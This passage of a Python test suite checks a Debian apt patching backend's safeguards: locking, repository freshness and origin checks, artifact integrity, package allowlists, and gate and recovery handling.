            self.assertEqual(self.backend._gate(), {"plan_id": PLAN})
            self.assertEqual(self.backend.inspect()["packages"][1]["version"], "1.0-1")
        result = self.execute(callback)
        self.assertTrue(result["verified_singleton"])
        self.assertEqual(self.runner.events, ["lock", "resolve", "simulate", "download", "artifact",
                                             "resolve", "simulate", "callback", "install", "unlock"])
        self.assertTrue(all(frontend for _, _, _, frontend in self.runner.commands))
        commands = [c for c, _, _, _ in self.runner.commands]
        self.assertEqual(commands[0], ["/usr/bin/python3", "-I", backends._PROBE, "resolve", "widget", "amd64"])
        self.assertEqual(commands[1], ["/usr/bin/apt-get", "--simulate", "--assume-yes", "--no-remove", "--only-upgrade",
                                       "--no-install-recommends", "install", "--", "widget:amd64=" + target()["to_version"]])
        self.assertEqual(commands[-1][:-1], ["/usr/bin/dpkg", "--force-confdef", "--force-confold", "--install"])
        staging = Path(commands[-1][-1]).parent
        self.assertEqual(staging.parent, self.state)
        self.assertFalse(staging.exists())
        self.assertEqual(self.runner.commands[-1][1:3], (900, str(staging)))
        self.assertEqual(commands[2][4:-1], ["widget", "amd64", target()["to_version"], target()["sha256"], str(len(ARTIFACT)),
                                          "c" * 64, "d" * 64])
        self.assertTrue(self.backend._gate_path.exists())

    def test_real_frontend_context_handoff_never_reopens_lock_inode(self):
        frontend = self.root / "frontend-lock"
        frontend.touch(mode=0o600)
        trusted_runner = runner_module.Runner()
        original_context = self.runner.dpkg_frontend_lock
        original_run = self.runner.run

        @contextmanager
        def context():
            with trusted_runner.dpkg_frontend_lock(), original_context():
                yield self.runner

        def run(argv, **kwargs):
            self.assertEqual(trusted_runner._environment()["DPKG_FRONTEND_LOCKED"], "true")
            return original_run(argv, **kwargs)

        self.runner.dpkg_frontend_lock = context
        self.runner.run = run
        real_open = os.open
        opened = []
        def open_file(path, *args, **kwargs):
            opened.append(os.fspath(path))
            return real_open(path, *args, **kwargs)
        with patch.object(runner_module, "_FRONTEND_LOCK_PATH", str(frontend)), \
                patch.object(backends.os, "open", side_effect=open_file):
            self.execute()
        self.assertEqual(opened.count(str(frontend)), 1)
        self.assertNotIn("DPKG_FRONTEND_LOCKED", trusted_runner._environment())

    def test_native_false_or_nonroot_cannot_mutate_even_with_fake_runner(self):
        # The authorization test restores the real method despite fixture-only
        # suppression of root checks elsewhere. No real runner is ever used.
        with patch.object(backends.os, "geteuid", return_value=1000):
            for live in (False, True):
                candidate = DebianApt(self.runner, live=live)
                with self.assertRaises(PolicyError):
                    _REAL_LIVE(candidate)
        candidate = DebianApt(self.runner, live=False)
        with patch.object(DebianApt, "_live", _REAL_LIVE), patch.object(backends.os, "geteuid", return_value=0):
            with self.assertRaises(PolicyError), candidate.lock("synthetic-host"):
                pass
            with self.assertRaises(PolicyError):
                candidate.apply(target(), self.pol, before_mutation=lambda: None)
        self.assertFalse(self.state.exists())
        self.assertEqual(self.runner.commands, [])

    def test_generation_is_readonly_when_native_state_is_absent(self):
        other = DebianApt(self.runner, live=False)
        self.assertEqual(self.backend.generation(), "0" * 64)
        self.assertEqual(other.generation(), "0" * 64)
        self.assertFalse(self.state.parent.exists())
        self.assertEqual(self.runner.commands, [])
        with self.backend.lock("synthetic-host"):
            self.backend.begin(PLAN)
        with self.backend.lock("synthetic-host", recovery=True):
            self.backend.clear_gate(PLAN, "Synthetic shared native recovery")
        self.assertNotEqual(other.generation(), "0" * 64)
        self.assertEqual(other.generation(), self.backend.generation())

    def test_generation_does_not_hide_unsafe_native_state_ancestors(self):
        public = self.root / "public"
        public.mkdir(mode=0o700)
        public.chmod(0o777)
        with patch.object(backends, "_NATIVE_STATE", public / "absent"):
            candidate = DebianApt(self.runner)
        with self.assertRaises(BackendError):
            candidate.generation()
        self.assertFalse((public / "absent").exists())

    def test_resolve_does_not_create_state_or_download(self):
        self.resolve()
        self.assertFalse(self.state.exists())
        self.assertNotIn("download", self.runner.events)
        self.assertNotIn("install", self.runner.events)

    def test_wrong_platform_identity_collector_hold_and_partial_database(self):
        changes = [lambda i: i.update(os="ubuntu"), lambda i: i.update(release="bookworm"),
                   lambda i: i.update(architecture="arm64"), lambda i: i.update(complete=False),
                   lambda i: i.update(collector="imported"), lambda i: i.update(asset_id="another-host"),
                   lambda i: i["packages"][1].update(held=True), lambda i: i["packages"][0].update(status="half-configured")]
        for change in changes:
            inv = inventory("native")
            change(inv)
            with self.subTest(inventory=inv), self.assertRaises((BackendError, PolicyError)):
                self.backend.resolve(inv, finding(inv), self.pol)
        self.assertEqual(self.runner.commands, [])

    def test_candidate_auth_origin_configuration_and_source_mismatch(self):
        changes = [lambda e: e.update(authenticated=False), lambda e: e.update(essential=True),
                   lambda e: e["target"].update(config_digest="e" * 64),
                   lambda e: e["target"].update(source_name="foreign"),
                   lambda e: e["target"].update(source_version="1.0-1"),
                   lambda e: e["target"].update(to_version="1.0-1"),
                   lambda e: e["target"]["origins"][0].update(codename="stable"),
                   lambda e: e["target"]["origins"][0].update(site="evil.invalid")]
        original = copy.deepcopy(self.runner.evidence)
        for change in changes:
            self.runner.evidence = copy.deepcopy(original)
            change(self.runner.evidence)
            with self.subTest(change=change), self.assertRaises((BackendError, PolicyError)):
                self.resolve()

    def test_repository_date_and_expiry_checks(self):
        for release in ({"date": CLOCK + 1}, {"date": CLOCK - 86401}, {"valid_until": CLOCK},
                        {"codename": "sid"}, {"date": "yesterday"}, {"valid_until": True}):
            self.runner.evidence["releases"] = [release_evidence(**{"valid_until": None, **release})]
            with self.subTest(release=release), self.assertRaises((BackendError, ValidationError)):
                self.resolve()
        self.runner.evidence["releases"] = [release_evidence(valid_until=None)]
        self.assertEqual(self.resolve(), target())

    def test_release_evidence_preserves_all_constraints_without_positional_pairing(self):
        extra_origin = dict(ORIGIN, archive="stable-security", codename="trixie-security", site="security.example.invalid")
        self.runner.target["origins"].append(extra_origin)
        self.pol["allowed_origins"].append(copy.deepcopy(extra_origin))
        self.runner.evidence["releases"] = [release_evidence(origin=extra_origin, codename="trixie-security"),
                                            release_evidence(date=CLOCK - 200), release_evidence()]
        self.assertEqual(self.resolve(), self.runner.target)

    def test_any_stale_same_origin_release_blocks_in_either_order(self):
        stale = release_evidence(date=CLOCK - 86401, valid_until=None)
        fresh = release_evidence()
        for evidence in ([stale, fresh], [fresh, stale]):
            self.runner.evidence["releases"] = evidence
            with self.subTest(evidence=evidence), self.assertRaisesRegex(BackendError, "stale"):
                self.resolve()
        expired = release_evidence(valid_until=CLOCK)
        self.runner.evidence["releases"] = [expired, fresh]
        with self.assertRaisesRegex(BackendError, "expired"):
            self.resolve()

    def test_release_evidence_is_exact_bounded_and_covers_each_origin(self):
        for records in ([], [dict(release_evidence(), extra=True)],
                        [release_evidence(origin=dict(ORIGIN, site="foreign.invalid"))],
                        [{k: v for k, v in release_evidence().items() if k != "origin"}],
                        [release_evidence(origin=[])], [release_evidence(codename=None)]):
            self.runner.evidence["releases"] = records
            with self.subTest(records=records), self.assertRaises((BackendError, ValidationError)):
                self.resolve()
        self.runner.evidence["releases"] = [release_evidence(date=CLOCK - index - 1) for index in range(1024)]
        self.assertEqual(self.resolve(), target())
        self.runner.evidence["releases"].append(release_evidence(date=CLOCK - 1025))
        with self.assertRaises(BackendError):
            self.resolve()
        extra = dict(ORIGIN, site="other.example.invalid")
        self.runner.target["origins"].append(extra)
        self.pol["allowed_origins"].append(extra)
        self.runner.evidence["releases"] = [release_evidence()]
        with self.assertRaisesRegex(BackendError, "evidence"):
            self.resolve()

    def test_post_callback_freshness_check_blocks_expiry_age_and_clock_reversal(self):
        for label, release, timestamp in (("expiry", release_evidence(), CLOCK + 1000),
                                          ("age", release_evidence(valid_until=None), CLOCK + 86301),
                                          ("future", release_evidence(), CLOCK - 101)):
            clock = [CLOCK]
            self.runner.evidence["releases"] = [release]
            self.runner.events.clear()
            self.runner.commands.clear()
            def callback():
                self.runner.events.append("callback")
                clock[0] = timestamp
            with self.subTest(label=label), patch.object(backends, "now", side_effect=lambda: clock[0]):
                with self.assertRaises(BackendError):
                    self.execute(callback)
            self.assertNotIn("install", self.runner.events)
            self.assertEqual(self.runner.events[-2:], ["callback", "unlock"])
            self.assertEqual(self.runner.events.count("resolve"), 2)
            self.assertEqual(self.runner.events.count("simulate"), 2)
            self.assertEqual(self.backend.inspect(), inventory("native"))
            with self.backend.lock("synthetic-host", recovery=True):
                self.backend.clear_gate(PLAN, "Synthetic authorization callback crossed a release time boundary")

    def test_post_callback_check_uses_retained_constraints_not_mutable_probe_data(self):
        clock = [CLOCK]
        def callback():
            clock[0] = CLOCK + 1000
            self.runner.evidence["releases"][0]["valid_until"] = CLOCK + 10000
        with patch.object(backends, "now", side_effect=lambda: clock[0]), self.assertRaises(BackendError):
            self.execute(callback)
        self.assertNotIn("install", self.runner.events)

    def test_post_callback_freshness_success_has_no_extra_preparation_window(self):
        self.runner.evidence["releases"] = [release_evidence(valid_until=None)]
        clock = [CLOCK]
        def callback():
            clock[0] = CLOCK + 86300  # Exactly max_repository_age, still valid.
            self.runner.events.append("callback")
        with patch.object(backends, "now", side_effect=lambda: clock[0]):
            self.assertTrue(self.execute(callback)["verified_singleton"])
        self.assertEqual(self.runner.events[-3:], ["callback", "install", "unlock"])
        self.assertEqual(self.runner.events.count("resolve"), 2)
        self.assertEqual(self.runner.events.count("simulate"), 2)

    def test_candidate_and_artifact_relationships_are_independently_rejected(self):
        for field in ("Conflicts", "Breaks", "Replaces"):
            self.runner.evidence["relationships"][field] = "other"
            with self.subTest(field=field), self.assertRaises(BackendError):
                self.resolve()
            self.runner.evidence["relationships"][field] = ""
            self.runner.artifact["relationships"][field] = "other"
            with self.assertRaises(BackendError):
                self.execute()
            self.assertNotIn("install", self.runner.events)
            self.runner.artifact["relationships"][field] = ""
            with self.backend.lock("synthetic-host", recovery=True):
                self.backend.clear_gate(PLAN, "Synthetic pre-install check failed")

    def test_simulation_rejects_every_non_singleton_change(self):
        valid = f"Inst widget [1.0-1] ({target()['to_version']} Debian:stable [amd64])\nConf widget ({target()['to_version']} Debian:stable [amd64])\n"
        for output in ("", valid + "Remv other [1.0-1]\n", valid + "Purg other [1.0-1]\n",
                       valid + "Inst extra (2.0 Debian:stable [amd64])\n", valid + "Conf other (1.0 Debian:stable [amd64])\n",
                       valid.replace("[1.0-1]", "[0.9-1]"), valid.replace("widget", "other"),
                       valid.replace(target()["to_version"], "0.9-1"), valid.replace("[amd64]", "\x00")):
            self.runner.simulation = output
            with self.subTest(output=output), self.assertRaises(BackendError):
                self.resolve()

    def test_artifact_hash_size_identity_and_extra_files(self):
        cases = [("hash", lambda: setattr(self.runner, "download_bytes", b"x" * len(ARTIFACT))),
                 ("short", lambda: setattr(self.runner, "download_bytes", ARTIFACT[:-1])),
                 ("long", lambda: setattr(self.runner, "download_bytes", ARTIFACT + b"x")),
                 ("extra", lambda: setattr(self.runner, "download_extra", True)),
                 ("symlink", lambda: setattr(self.runner, "download_symlink", True)),
                 ("name", lambda: self.runner.artifact.update(name="evil")),
                 ("architecture", lambda: self.runner.artifact.update(architecture="arm64")),
                 ("source", lambda: self.runner.artifact.update(source_version="1.0-1")),
                 ("essential", lambda: self.runner.artifact.update(essential=True))]
        original = copy.deepcopy(self.runner.artifact)
        for name, change in cases:
            change()
            with self.subTest(case=name), self.assertRaises((BackendError, OSError)):
                self.execute()
            self.assertNotIn("install", self.runner.events)
            with self.backend.lock("synthetic-host", recovery=True):
                self.backend.clear_gate(PLAN, "Synthetic artifact rejected before installation")
            self.runner.download_bytes = ARTIFACT
            self.runner.download_extra = self.runner.download_symlink = False
            self.runner.artifact = copy.deepcopy(original)

    def test_repository_or_inventory_drift_after_download_blocks_callback(self):
        callback = Mock()
        self.runner.after_download = lambda: self.runner.inventory["packages"][0].update(held=True)
        with self.assertRaises(BackendError):
            self.execute(callback)
        callback.assert_not_called()
        self.assertNotIn("install", self.runner.events)

    def test_metadata_fingerprint_drift_after_download_requires_replanning(self):
        self.runner.after_download = lambda: self.runner.target.update(metadata_digest="e" * 64)
        with self.assertRaises(BackendError):
            self.execute()
        self.assertNotIn("install", self.runner.events)

    def test_callback_denial_preserves_gate_without_install(self):
        with self.assertRaises(PolicyError):
            self.execute(Mock(side_effect=PolicyError("expired approval")))
        self.assertNotIn("install", self.runner.events)
        self.assertTrue(self.backend._gate_path.exists())

    def test_nonzero_exit_postwrite_errors_and_interrupt_are_indeterminate(self):
        for error in (IndeterminateError("startup handshake"), BackendError("late validation"),
                      OSError("lost connection"), KeyboardInterrupt()):
            self.runner.install_failure = error
            with self.subTest(error=type(error).__name__):
                with self.assertRaises(KeyboardInterrupt if isinstance(error, KeyboardInterrupt) else IndeterminateError):
                    self.execute()
                self.assertTrue(self.backend._gate_path.exists())
                self.assertEqual(self.runner.events[-1], "unlock")
                with self.backend.lock("synthetic-host", recovery=True):
                    self.backend.clear_gate(PLAN, "Synthetic startup/interruption investigated")
        self.runner.install_failure = None
        self.runner.install_status = 1
        with self.assertRaises(IndeterminateError):
            self.execute()
        self.assertEqual(self.backend.inspect()["packages"][1]["version"], target()["to_version"])

    def test_confirmed_download_failure_is_premutation_and_can_clear_gate(self):
        original_run = self.runner.run
        def run(argv, **kwargs):
            if argv[0] == "/usr/bin/python3" and argv[3] == "download":
                return CommandResult(1, "", "untrusted remote diagnostic")
            return original_run(argv, **kwargs)
        self.runner.run = run
        callback = Mock()
        with self.backend.lock("synthetic-host"):
            self.backend.begin(PLAN)
            with self.assertRaises(BackendError) as caught:
                self.backend.apply(target(), self.pol, before_mutation=callback)
            self.assertNotIn("untrusted remote diagnostic", str(caught.exception))
            self.backend.finish(PLAN, "failed")
        callback.assert_not_called()
        self.assertFalse(self.backend._gate_path.exists())
        self.assertNotIn("install", self.runner.events)
        self.assertEqual(self.backend.inspect(), inventory("native"))

    def test_readonly_probe_uncertainty_is_not_reclassified_as_confirmed_failure(self):
        self.runner.probe_failure = IndeterminateError("read-only process cleanup could not be confirmed")
        with self.assertRaises(IndeterminateError):
            self.execute()
        self.assertTrue(self.backend._gate_path.exists())
        self.assertNotIn("install", self.runner.events)

    def test_full_singleton_delta_is_verified_locally(self):
        mutations = [lambda i: i["packages"][0].update(version="2.0-1"),
                     lambda i: i["packages"][1].update(status="half-configured"),
                     lambda i: i["packages"].pop(0), lambda i: i["packages"][0].update(held=True),
                     lambda i: i["packages"].append(dict(i["packages"][0], name="new-package"))]
        for mutation in mutations:
            self.runner.inventory = inventory("native")
            self.runner.post_mutation = mutation
            with self.subTest(mutation=mutation), self.assertRaises(IndeterminateError):
                self.execute()
            self.assertTrue(self.backend._gate_path.exists())
            # Recovery must remain possible for a partially configured database.
            with self.backend.lock("synthetic-host", recovery=True):
                self.backend.clear_gate(PLAN, "Synthetic non-singleton outcome inspected")

    def test_created_native_state_directories_are_durable_before_gate(self):
        real_sync = os.fsync
        directories = []
        def sync(descriptor):
            info = os.fstat(descriptor)
            if stat.S_ISDIR(info.st_mode):
                directories.append((info.st_dev, info.st_ino))
            real_sync(descriptor)
        with patch.object(backends.os, "fsync", side_effect=sync):
            with self.backend.lock("synthetic-host"):
                self.backend.begin(PLAN)
        self.assertEqual(directories, [(path.stat().st_dev, path.stat().st_ino)
                                       for path in (self.root, self.state.parent, self.state)])

    def test_native_gate_blocks_other_instances_and_asset_aliases(self):
        with self.backend.lock("synthetic-host"):
            other = DebianApt(self.runner, live=True)
            with self.assertRaises(BackendError), other.lock("another-host"):
                pass
            self.backend.begin(PLAN)
        other = DebianApt(self.runner, live=True)
        with self.assertRaises(BackendError), other.lock("synthetic-host"):
            pass
        with other.lock("synthetic-host", recovery=True) as gate:
            self.assertEqual(gate, {"plan_id": PLAN})
            other.clear_gate(PLAN, "No mutation was invoked")

    def test_recovery_requires_database_lock_and_releases_frontend_on_denial(self):
        with self.backend.lock("synthetic-host"):
            self.backend.begin(PLAN)
        parent, child = multiprocessing.Pipe()
        process = multiprocessing.Process(target=_hold_lock, args=(str(self.database_lock), child), kwargs={"record": True})
        process.start()
        try:
            self.assertTrue(parent.poll(3))
            parent.recv()
            with self.assertRaises(BackendError), self.backend.lock("synthetic-host", recovery=True):
                pass
            self.assertFalse(self.runner.frontend)
            self.assertTrue(self.backend._gate_path.exists())
        finally:
            parent.send("done")
            process.join(3)
            if process.is_alive():
                process.kill()
                process.join(3)
            parent.close()
            child.close()
        with self.backend.lock("synthetic-host", recovery=True):
            self.backend.clear_gate(PLAN, "Synthetic surviving database lock has exited")

    def test_policy_prerequisites_allowlists_and_sensitive_packages(self):
        for key in ("allow_maintainer_scripts", "recovery_confirmed", "trusted_installed_lineage"):
            self.pol[key] = False
            with self.assertRaises(PolicyError):
                self.resolve()
            self.pol[key] = True
        for key in ("allowed_assets", "allowed_packages"):
            previous = self.pol[key]
            self.pol[key] = []
            with self.assertRaises(PolicyError):
                self.resolve()
            self.pol[key] = previous
        for source in ("systemd", "glibc", "apt", "dpkg"):
            inv = inventory("native")
            inv["packages"][1]["source_name"] = source
            with self.subTest(source=source), self.assertRaises(BackendError):
                backends._policy(self.pol, inv, inv["packages"][1], "debian-apt")
        for name in ("dpkg", "apt", "linux-image-amd64", "grub-pc", "systemd", "libc6"):
            inv = inventory("native")
            inv["packages"][1]["name"] = name
            inv = normalize_inventory(inv, collector="native")
            package = next(p for p in inv["packages"] if p["name"] == name)
            with self.subTest(package=name), self.assertRaises(BackendError):
                backends._policy(dict(self.pol, allowed_packages=[name]), inv, package, "debian-apt")


_REAL_LIVE = DebianApt._live


class ImportTests(unittest.TestCase):
    def test_no_import_requires_python_apt(self):
        with patch.dict(sys.modules, {"apt": None, "apt_pkg": None, "apt_inst": None}):
            importlib.import_module("autoprotect._apt_probe")
            importlib.import_module("autoprotect.backends")


if __name__ == "__main__":
    unittest.main()
